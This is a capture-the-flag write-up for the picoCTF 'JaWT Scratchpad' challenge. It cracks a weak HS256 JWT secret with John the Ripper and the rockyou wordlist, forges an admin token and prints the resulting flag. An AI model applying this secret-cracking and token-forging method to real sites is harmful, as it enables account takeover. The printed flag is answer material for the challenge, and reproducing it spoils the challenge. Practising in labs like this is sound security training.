# JaWT Scratchpad


JWT in cookie for test account (in file `token`)

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCJ9.IAu_YSHppFe8hXH_BSPb4OLJYGUi8wXqXdS0T33cKbA
```

decoded header and payload (JWT omits padding with equal sign, expect errors) 
```
{"typ":"JWT","alg":"HS256"}.{"user":"test"}.<signature>
```

use johntheripper to crack last part of JWT (HS256 --> HMAC-SHA256)  
use aquired key to sign admin JWT

``` 
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt token.data
```
res: `ilovepico`

create admin JWT on jwt.io

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```

replace cookie value on challenge site with freshly signed JWT


flag: `picoCTF{jawt_was_just_what_you_thought_f859ab2f}`
